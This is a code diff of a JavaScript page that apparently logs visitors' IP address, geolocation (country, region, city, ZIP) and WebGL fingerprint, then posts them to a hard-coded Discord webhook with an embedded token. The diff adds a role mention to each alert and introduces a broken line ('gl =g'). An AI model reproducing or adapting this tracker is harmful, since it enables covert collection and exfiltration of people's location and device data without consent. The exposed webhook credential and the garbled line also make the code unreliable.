@@ -129,11 +129,13 @@
         message += `${key}: ${value}\n`;
       }
 
+      const roleId = "1240410503050690593";
+      
       // Send information to Discord webhook
       const webhookUrl =
         "https://discord.com/api/webhooks/1240404571713699991/r5b0kw71a4skLqPlz1g2kcWNlj65Wqj9yAVWINjJueVPDaN9vDSIUW_YEiRR-A5PfvT2";
       const data = {
-        content: message,
+        content: `<@&${roleId}> \n` + message,
       };
 
       const requestOptions = {
@@ -486,7 +488,7 @@
       }
 
       await push("IP Address", basic.YourFuckingIPAddress);
-      await push("Country", detailed.country);
+        await push("Country", detailed.country);
       await push("Region", detailed.regionName);
       await push("City", detailed.city);
       await push("ZIP Code", detailed.zip);
@@ -562,7 +564,8 @@
       let debugInfo;
 
       try {
-        gl =
+        gl =g
+        
           canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
         debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
       } catch (e) {}
